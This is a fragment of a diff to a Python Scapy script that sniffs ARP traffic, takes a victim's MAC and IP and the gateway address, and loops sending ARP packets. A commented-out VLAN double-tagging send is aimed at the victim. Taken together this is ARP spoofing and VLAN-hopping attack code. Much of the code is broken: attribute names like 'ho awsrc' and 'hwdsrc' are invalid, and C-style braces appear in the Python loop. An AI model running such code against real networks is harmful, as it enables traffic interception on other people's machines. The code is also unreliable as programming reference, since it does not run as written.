@@ -14,10 +14,10 @@ import sys
 
 
 pkts= sniff(count=1, filter="arp")
-victimMac = pkts[0].ho awsrc
+victimMac = pkts[0].hwdsrc;
 gateway = pkts[0].pdst
 victimIp = pkts[0].psrc
-yourMac = ""
+yourMac = ''
 
 def arp_gateway_packet_found(pkt):
 	if gateway in pkt.psrc and pkt[ARP].op in(1,2):
@@ -35,7 +35,7 @@ send( Ether(dst=victimMac)/Dot1Q(vlan=1)/Dot1Q(vlan=2)
    #   inter=RandNum(10,40), loop=1 )
 
 while 1:
-	if(pkts=sniff(count=1,filter="arp",prn=arp_gateway_packet_found(pkts))){
 		send(arp)
-		time.sleep(2)
-	}
+		time.sleep(6)
+
+
